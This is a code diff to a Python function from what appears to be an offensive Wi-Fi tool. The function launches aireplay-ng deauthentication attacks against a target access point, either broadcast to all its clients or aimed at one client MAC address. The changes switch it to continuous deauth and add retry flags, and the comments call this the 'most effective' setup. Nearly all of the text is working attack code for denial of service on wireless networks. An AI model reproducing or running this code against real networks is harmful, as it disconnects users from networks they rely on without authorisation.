@@ -44,39 +44,38 @@ def deauth_attack_single_optimized(target, mon_iface, window_index=0, client_mac
     Attack single target WITHOUT setting channel
     (channel should already be locked before calling this)
     If client_mac is provided, target specific client (more effective!)
+    
+    Uses DEAUTH_PACKETS=0 for continuous attack (most effective)
     """
     global active_attack_processes
     
     if client_mac:
-        title = f"DEAUTH [{window_index+1}] - {target['essid'][:10]} → {client_mac[-8:]}"
+        title = f"DEAUTH [{window_index+1}] {target['essid'][:10]} → {client_mac[-8:]}"
     else:
-        title = f"DEAUTH [{window_index+1}] - {target['essid'][:15]}"
+        title = f"DEAUTH [{window_index+1}] {target['essid'][:15]} (BROADCAST)"
     
-    # ✅ FIX: NOT setting channel here!
-    # Channel is already locked in deauth_attack_multi()
+    # Determine packet count (0 = continuous)
+    packet_arg = DEAUTH_PACKETS if DEAUTH_PACKETS > 0 else 0
     
-    # Build command with optional -c for client targeting
     if client_mac:
-        # Targeted deauth (MORE EFFECTIVE according to documentation)
-        cmd = f"xterm -geometry 80x15+{window_index * 50}+{window_index * 30} " \
+        # TARGETED deauth - attacks both directions (AP → Client, Client → AP)
+        # This is MORE EFFECTIVE than broadcast!
+        cmd = f"xterm -geometry 85x12+{window_index * 60}+{window_index * 40} " \
               f"-bg black -fg red -title '{title}' -e " \
-              f"'while true; do " \
-              f"aireplay-ng --deauth {DEAUTH_PACKETS} " \
+              f"'aireplay-ng --deauth {packet_arg} " \
               f"-a {target['bssid']} " \
               f"-c {client_mac} " \
-              f"--ignore-negative-one {mon_iface}; " \
-              f"sleep {DEAUTH_DELAY}; " \
-              f"done'"
+              f"-D " \
+              f"--ignore-negative-one {mon_iface}'"
     else:
-        # Broadcast deauth (all clients)
-        cmd = f"xterm -geometry 80x15+{window_index * 50}+{window_index * 30} " \
+        # BROADCAST deauth (all clients on AP)
+        # -D flag enables AP detection retry for better results
+        cmd = f"xterm -geometry 85x12+{window_index * 60}+{window_index * 40} " \
               f"-bg black -fg red -title '{title}' -e " \
-              f"'while true; do " \
-              f"aireplay-ng --deauth {DEAUTH_PACKETS} " \
+              f"'aireplay-ng --deauth {packet_arg} " \
               f"-a {target['bssid']} " \
-              f"--ignore-negative-one {mon_iface}; " \
-              f"sleep {DEAUTH_DELAY}; " \
-              f"done'"
+              f"-D " \
+              f"--ignore-negative-one {mon_iface}'"
     
     proc = subprocess.Popen(
         cmd, 
